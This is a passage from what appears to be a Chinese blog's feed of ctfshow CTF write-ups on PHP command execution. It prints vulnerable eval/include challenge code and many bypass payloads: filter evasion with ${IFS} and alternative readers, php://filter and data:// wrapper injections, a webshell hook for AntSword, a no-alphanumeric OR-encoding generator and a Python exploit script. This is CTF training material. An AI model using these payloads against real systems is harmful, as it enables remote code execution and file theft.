class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">"system('tac flag*');"</span>    <span class="token punctuation">&#125;</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># upload_phar()</span>    getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2022/09/08/ming-ling-zhi-xing/"/>
      <url>/2022/09/08/ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<p>命令行匹配符</p><pre class="line-numbers language-none"><code class="language-none">*:匹配任意长度的任意字符?:匹配任意单个字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> [<a href="http://607cc3f5-2d8a-42ba-a28d-b777bac1cee5.challenge.ctf.show/?c=system(%27cat%20./fla*hp%27);%5D">http://607cc3f5-2d8a-42ba-a28d-b777bac1cee5.challenge.ctf.show/?c=system(%27cat%20./fla*hp%27);]</a>(view-source:<a href="http://607cc3f5-2d8a-42ba-a28d-b777bac1cee5.challenge.ctf.show/?c=system">http://607cc3f5-2d8a-42ba-a28d-b777bac1cee5.challenge.ctf.show/?c=system</a>(‘cat .&#x2F;fla*hp’);) </p><p>另外如果页面没发现东西，可以查看源代码看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于这种方式，可以这样用蚁剑连接：<code>?c=echo%20eval($_POST[1]);</code></p><p> PHP命令执行集锦：<a href="https://baijiahao.baidu.com/s?id=1727892145352892527&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1727892145352892527&amp;wfr=spider&amp;for=pc</a> </p><p>常用的命令执行： <a href="https://blog.csdn.net/wangyuxiang946/article/details/120241435">https://blog.csdn.net/wangyuxiang946/article/details/120241435</a> </p><p> <img src="/images/20210911182758707.png" alt="img"> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>绕过cat使用<code>tac more less head tac tail nl od(二进制查看) vi vim sort uniq</code></p><p>绕过空格用<code>%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</code></p><p><code>?c=passthru(&quot;tac%09fla*hp&quot;);</code></p><h2 id="把命令执行转化为文件包含"><a href="#把命令执行转化为文件包含" class="headerlink" title="把命令执行转化为文件包含"></a>把命令执行转化为文件包含</h2><p><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p> <code>?c=include$_GET[a]?&gt;&amp;a=php:*//filter/read=convert.base64-encode/resource=flag.php</code> </p><p>先使用**?&gt;闭合代码**，然后使用php:&#x2F;&#x2F;filter协议将目标文件进行base64编码，之后直接读取目标文件</p><p>CTF中文件包含漏洞总结 <a href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a> </p><p>文件包含&#x3D;&gt;代码执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="可以通过模拟传入代码实现命令执行"><a href="#可以通过模拟传入代码实现命令执行" class="headerlink" title="可以通过模拟传入代码实现命令执行"></a>可以通过模拟传入代码实现命令执行</h2><p><code>?c=data://text/plain,&lt;?php system(&#39;cat fla*php&#39;);</code></p><p>当然可以使用base64绕过一下： <code>?c=data:*//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTs=*</code> </p><p>可以使用短标签绕过php：<code>?c=data://text/plain,&lt;?= system(&#39;cat fla*p&#39;);</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注释绕过：<code>?c=data://text/plain,&lt;?= system(&#39;cat fla*p&#39;);//</code></p><p>尾部标签：<code>?c=data://text/plain,&lt;?= system(&#39;cat fla*p&#39;);?&gt;</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">方法一：?c=show_source(next(array_reverse(scandir(pos(localeconv())))));localeconv()获取本地货币信息pos(localeconv())获取本地货币信息的目录array_reverse(scandir(pos(localeconv())))扫描目录，对返回的数组进行排序next(array),去除数组中的下一个（第二个）元素方法二：var_dump(get_defined_vars())获取当前所有的参数在POST传入参数1=phpinfo();array(5) &#123; ["_GET"]=> array(1) &#123; ["c"]=> string(29) "var_dump(get_defined_vars());" &#125; ["_POST"]=> array(1) &#123; [1]=> string(13) "system('ls');" &#125; ["_COOKIE"]=> array(2) &#123; ["PHPSESSID"]=> string(26) "70lfjf244rohq9knksoujomkc8" ["SESSID"]=> string(5) "value" &#125; ["_FILES"]=> array(0) &#123; &#125; ["c"]=> string(29) "var_dump(get_defined_vars());" &#125; eval(array_pop(next(get_defined_vars())));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用未过滤的ascii符号，组合成函数"><a href="#使用未过滤的ascii符号，组合成函数" class="headerlink" title="使用未过滤的ascii符号，组合成函数"></a>使用未过滤的ascii符号，组合成函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token comment">//遍历ascii范围内的所有字符</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span>        <span class="token comment">//排除所有被过滤的字符</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>            <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用脚本：</p><p>如果自己提交，尽量不要使用有%0a,%0d之类的换行符号</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token comment"># 没有将php写入环境变量需手动运行</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'USER：python exp.py &lt;url>'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>url <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token string">""</span>    s2 <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            t <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> t <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>                <span class="token comment"># print(i)</span>                s1 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                s2 <span class="token operator">+=</span> t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> <span class="token string">"(\""</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> <span class="token string">"\"|\""</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">"\")"</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'c'</span><span class="token punctuation">:</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>param<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：<code>(&quot;%10%01%13%13%14%08%12%15&quot;|&quot;%60%60%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</code>其中%10和%60按位或为P,%01和%60按位或为A……</p><p>可以使用<code>；</code>、<code>%0a</code>、<code>%26%26</code>、<code>||</code>截断命令</p><p>绕过cat使用<code>tac more less head tac tail nl od(二进制查看) vi vim sort uniq</code></p><p>绕过空格用<code>%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</code></p><p>即使过滤了字符，但是%09，%0a仍然当成是整体不会被拦截</p><p> nl命令通过&lt;、&lt;&gt;来绕过空格 ， 可以使用两个单引号来绕过 <code>nl&lt;&gt;fla&#39;&#39;g.php||</code></p><p>利用可执行程序在bin目录下<code>?c=/bin/c??$&#123;IFS&#125;????????</code> cat flag.php</p><p>利用移动文件，把flag.php移动到其他文件，然后直接查看 ?c&#x3D;mv${IFS}fla?.php${IFS}z.txt ,然后在URl后面访问z.txt </p><h2 id="无字母数字的命令执行"><a href="#无字母数字的命令执行" class="headerlink" title="无字母数字的命令执行"></a>无字母数字的命令执行</h2><p>P神的文章： <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先写一个上传文件的HTML</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span 